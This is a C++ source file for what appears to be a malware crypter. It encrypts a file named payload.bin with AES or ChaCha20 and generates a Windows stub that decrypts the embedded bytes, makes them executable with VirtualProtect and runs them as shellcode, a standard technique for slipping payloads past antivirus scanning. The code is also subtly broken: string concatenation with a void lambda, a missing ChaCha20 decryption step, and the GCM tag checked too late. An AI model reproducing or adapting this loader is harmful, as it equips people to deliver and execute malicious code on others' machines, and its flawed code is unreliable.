#include <iostream>
#include <fstream>
#include <vector>
#include <iomanip>

#include <openssl/evp.h>
#include <openssl/rand.h>
#pragma comment(lib, "libcrypto.lib")

/* ---------- encryption ---------- */
enum class Method { AES_GCM, AES_CBC, CHACHA20, HYBRID };

struct Blob {
    std::vector<unsigned char> cipher;
    std::vector<unsigned char> key;
    std::vector<unsigned char> iv;
    std::vector<unsigned char> tag;   // GCM only
    Method method;
};

Blob encrypt(const std::vector<unsigned char>& data, Method m) {
    Blob b;
    b.method = m;

    const EVP_CIPHER* cipher = nullptr;
    size_t keyLen = 32, ivLen = 0, tagLen = 0;

    switch (m) {
    case Method::AES_GCM:   cipher = EVP_aes_256_gcm(); ivLen = 12; tagLen = 16; break;
    case Method::AES_CBC:   cipher = EVP_aes_256_cbc(); ivLen = 16; break;
    case Method::CHACHA20:  cipher = EVP_chacha20();    ivLen = 12; break;
    case Method::HYBRID:    cipher = EVP_aes_256_gcm(); ivLen = 12; tagLen = 16; break;
    }

    b.key.resize(keyLen);
    b.iv.resize(ivLen);
    if (tagLen) b.tag.resize(tagLen);

    RAND_bytes(b.key.data(), keyLen);
    RAND_bytes(b.iv.data(), ivLen);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, cipher, nullptr, b.key.data(), b.iv.data());

    std::vector<unsigned char> tmp = data;
    if (m == Method::HYBRID) {            // second layer: ChaCha20
        EVP_CIPHER_CTX* ctx2 = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx2, EVP_chacha20(), nullptr, b.key.data(), b.iv.data());
        int l1, l2;
        EVP_EncryptUpdate(ctx2, tmp.data(), &l1, tmp.data(), tmp.size());
        EVP_EncryptFinal_ex(ctx2, tmp.data() + l1, &l2);
        EVP_CIPHER_CTX_free(ctx2);
    }

    b.cipher.resize(tmp.size() + EVP_CIPHER_block_size(cipher));
    int outLen, finalLen;
    EVP_EncryptUpdate(ctx, b.cipher.data(), &outLen, tmp.data(), tmp.size());
    EVP_EncryptFinal_ex(ctx, b.cipher.data() + outLen, &finalLen);
    b.cipher.resize(outLen + finalLen);

    if (tagLen)
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, tagLen, b.tag.data());
    EVP_CIPHER_CTX_free(ctx);
    return b;
}

/* ---------- stub generator ---------- */
std::string generateStub(const Blob& b) {
    std::ostringstream h;
    auto hex = [&](const std::vector<unsigned char>& v) {
        for (unsigned char c : v) h << "0x" << std::hex << std::setw(2) << +c << ",";
    };

    return R"(#include <windows.h>
#include <openssl/evp.h>
#pragma comment(lib,"libcrypto.lib")
unsigned char blob[]={)" + hex(b.cipher) + R"(};
unsigned char key[]={)" + hex(b.key) + R"(};
unsigned char iv[]={)" + hex(b.iv) + R"(};
unsigned char tag[]={)" + (b.tag.empty() ? "" : hex(b.tag)) + R"(};
int main(){
const EVP_CIPHER* c=")" + (b.method == Method::AES_GCM ? "EVP_aes_256_gcm()" :
                            b.method == Method::AES_CBC ? "EVP_aes_256_cbc()" :
                            b.method == Method::CHACHA20 ? "EVP_chacha20()" : "EVP_aes_256_gcm()") + R"(";
EVP_CIPHER_CTX* ctx=EVP_CIPHER_CTX_new();
EVP_DecryptInit_ex(ctx,c,NULL,key,iv);
unsigned char plain[sizeof(blob)+256];
int outLen,finalLen;
EVP_DecryptUpdate(ctx,plain,&outLen,blob,sizeof(blob));
EVP_DecryptFinal_ex(ctx,plain+outLen,&finalLen);
if(sizeof(tag))EVP_CIPHER_CTX_ctrl(ctx,EVP_CTRL_GCM_SET_TAG,sizeof(tag),tag);
EVP_CIPHER_CTX_free(ctx);
DWORD old;VirtualProtect(plain,outLen+finalLen,PAGE_EXECUTE_READWRITE,&old);
((void(*)())plain)();
return 0;
})";
}

/* ---------- CLI ---------- */
int main() {
    std::string inFile = "payload.bin";
    std::string methodStr;
    Method m;

    std::cout << "Choose cipher:\n1 AES-256-GCM\n2 AES-256-CBC\n3 ChaCha20\n4 Hybrid (AES-GCM+ChaCha20)\n";
    int choice; std::cin >> choice;
    switch (choice) {
    case 1: m = Method::AES_GCM;   methodStr = "AES-256-GCM"; break;
    case 2: m = Method::AES_CBC;   methodStr = "AES-256-CBC"; break;
    case 3: m = Method::CHACHA20;  methodStr = "ChaCha20"; break;
    case 4: m = Method::HYBRID;    methodStr = "Hybrid"; break;
    default: std::cerr << "Invalid\n"; return 1;
    }

    std::ifstream f(inFile, std::ios::binary);
    std::vector<unsigned char> data((std::istreambuf_iterator<char>(f)),
                                    std::istreambuf_iterator<char>());

    auto blob = encrypt(data, m);
    std::ofstream stub("stub_" + methodStr + ".cpp");
    stub << generateStub(blob);
    std::cout << "stub_" << methodStr << ".cpp generated.\n";
    return 0;
}
